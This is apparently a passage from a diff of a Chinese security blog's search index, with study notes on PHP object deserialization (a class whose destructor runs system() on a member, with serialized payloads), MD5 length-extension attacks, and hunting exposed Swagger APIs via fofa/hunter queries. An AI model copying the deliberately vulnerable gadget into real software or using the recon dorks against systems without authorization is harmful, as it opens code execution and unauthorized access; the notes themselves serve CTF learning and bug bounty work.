urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>比较</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public代码的结果:</span><br><span class="line">O:4:&quot;Test&quot;:1:&#123;s:7:&quot;command&quot;;s:11:&quot;echo &quot;test&quot;&quot;;&#125;</span><br><span class="line">O%3A4%3A%22Test%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A11%3A%22echo+%22test%22%22%3B%7Dtest</span><br><span class="line"></span><br><span class="line">private代码的结果:</span><br><span class="line">O:4:&quot;Test&quot;:1:&#123;s:13:&quot;Testcommand&quot;;s:11:&quot;echo &quot;test&quot;&quot;;&#125;</span><br><span class="line">O%3A4%3A%22Test%22%3A1%3A%7Bs%3A13%3A%22%00Test%00command%22%3Bs%3A11%3A%22echo+%22test%22%22%3B%7Dtest</span><br></pre></td></tr></table></figure>
+
+<p>一眼能看到,这两串序列的区别是command成员的变量名以什么形式序列化,通过观察url编码可以看出:</p>
+<ol>
+<li>public变量以command来序列化</li>
+<li>private变量以%00Test%00command的形式序列化</li>
+</ol>
+<h1 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h1><blockquote>
+<p>基本同上<br>3. protected变量以%00*%00command的形式序列化</p>
+</blockquote>
+<h1 id="遇到的问题和通解"><a href="#遇到的问题和通解" class="headerlink" title="遇到的问题和通解"></a>遇到的问题和通解</h1><p>成员类型决定我们能修改变量值的方式<br>可以通过</p>
+<ol>
+<li>$a-&gt;command &#x3D; ‘echo “test”‘;</li>
+<li>private $command &#x3D; ‘echo “test”‘;<br>的方式修改</li>
+</ol>
+<p>但如果一个类要在统一用多次,而其成员的类型是private且要赋不同的值<br>那么可以在poc里写专门的成员函数来更改成员变量的值:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    private $command;</span><br><span class="line"></span><br><span class="line">    function vuln($payload) &#123;</span><br><span class="line">        system($payload);</span><br><span class="line">    &#125;</span><br><span class="line">    function setCommand($payload)&#123;</span><br><span class="line">        $this-&gt;command=$payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;vuln($this-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;setCommand(&quot;echo &#x27;test&#x27;&quot;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参考</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/6454?time__1311=n4+xnD0Dg70=G=oeGN3ExmxWuxGwSgx+7+iD#toc-1">https://xz.aliyun.com/t/6454?time__1311=n4%2BxnD0Dg70%3DG%3DoeGN3ExmxWuxGwSgx%2B7%2BiD#toc-1</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>md5-extension-attack</title>
+    <url>/2024/09/10/md5-extension-attack/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<p>请看如下网页源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// $random = random();</span><br><span class="line"></span><br><span class="line">echo md5($random);</span><br><span class="line">$extension=$_POST[&#x27;extension&#x27;];</span><br><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line"></span><br><span class="line">if (md5($random . $extension) !== $md5) &#123;</span><br><span class="line">    echo &quot;被打穿了呜呜&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如何使以上的条件判断成立?<br>明白这个问题需要知道md5这个算法的结构</p>
+<h1 id="Merkle-Damgard结构"><a href="#Merkle-Damgard结构" class="headerlink" title="Merkle-Damgård结构"></a>Merkle-Damgård结构</h1><p>该结构,会将输入的数据进行填充并分割成压缩函数f能处理的长度,然后处理分割后的数据<br>hash的计算方式如下<br><img src="/2024/09/10/md5-extension-attack/1.png" alt="wiki上截的"><br>一开始的压缩函数以一个固定的向量和第一个分组数据为输入<br>产生的结果为下一次压缩函数调用需要的向量,与下一组数据同时作为输入进行计算</p>
+<h1 id="通过长度拓展劫持加密过程"><a href="#通过长度拓展劫持加密过程" class="headerlink" title="通过长度拓展劫持加密过程"></a>通过长度拓展劫持加密过程</h1><p>一个hash的输入必须被填充为512bits的倍数+448bits<br>即 输入的长度(单位bit)和448关于512同模</p>
+<p>再次回顾上面的代码<br>random的md5实际上是填充后的结果<br>如果将md5和extension作为输入,再算一次,就能得到random+padding+extension的md5值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line"></span><br><span class="line">if (md5($random . $extension) !== $md5)</span><br></pre></td></tr></table></figure>
+<p>代码的这一部分<br>只要构造extension&#x3D;padding+extension,就能控制靶机网页的md5计算过程,使其计算出计划中的新md5值</p>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><blockquote>
+<p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
+</blockquote>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
+<p><a href="https://luoingly.top/post/md5-length-extension-attack/">https://luoingly.top/post/md5-length-extension-attack/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>crypto</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>swagger-未授权api</title>
+    <url>/2024/10/19/src/swagger-%E6%8E%A2%E7%B4%A2%E6%9C%AA%E6%8E%88%E6%9D%83/swagger-%E6%8E%A2%E7%B4%A2%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
+    <content><![CDATA[<p>在挖src（挖了个p），我复盘了一下让学长看，学长认为我不够深入，要对看到的每个组件进行深入学习，看看有哪些洞留个印象，以后挖洞容易看出来，也会快很多</p>
+<p>所以，这篇漏洞记录会写下针对某组件的信息搜集方式和利用方式<br><del>顺便挖个公益</del></p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hunter app.name=&quot;Spring Whitelabel Error&quot;</span><br><span class="line">fofa app=&quot;Swagger&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h1><p>Swagger 是一个开源的API 设计和文档工具，它可以帮助开发人员更快、更简单地设计、构建、文档化和测试RESTful API</p>
+<p>当swagger的页面不受保护的展示，就泄漏了api<br>而API中的一部分功能重要却不受保护，产生了未授权</p>
+<p>根据对应人员的具体api设计，针对性的利用能产生较大危害</p>
+<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>swagger基于spring-boot，所以要找到所有spring-boot站点<br>要根据站点找swagger的常见网页<br>读取swagger文档的内容测试api</p>
+<p>工具：</p>
+<ol>
+<li>快速发现swagger网页，或spring-boot其他接口</li>
+<li>快速获取可用接口 <a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a></li>
+</ol>
+<h1 id="三、信息结果"><a href="#三、信息结果" class="headerlink" title="三、信息结果"></a>三、信息结果</h1><p>我们得到了大量的api和对应的简单测试结果<br>结果分：</p>
+<ol>
+<li>token Error</li>
+<li>其他</li>
+</ol>
+<p>2就是未授权，处理2时要看对应的api文档尝试利用</p>
+<h1 id="四、API利用"><a href="#四、API利用" class="headerlink" title="四、API利用"></a>四、API利用</h1><p>接口怎么用已经写在文档里的，但是这是给程序员看的</p>
+<p>未完待续</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/15153">https://xz.aliyun.com/t/15153</a> </p>
+]]></content>
+      <categories>
+        <category>src</category>
+      </categories>
+      <tags>
+        <tag>笔记 - 漏洞记录</tag>
+      </tags>
   </entry>
 </search>
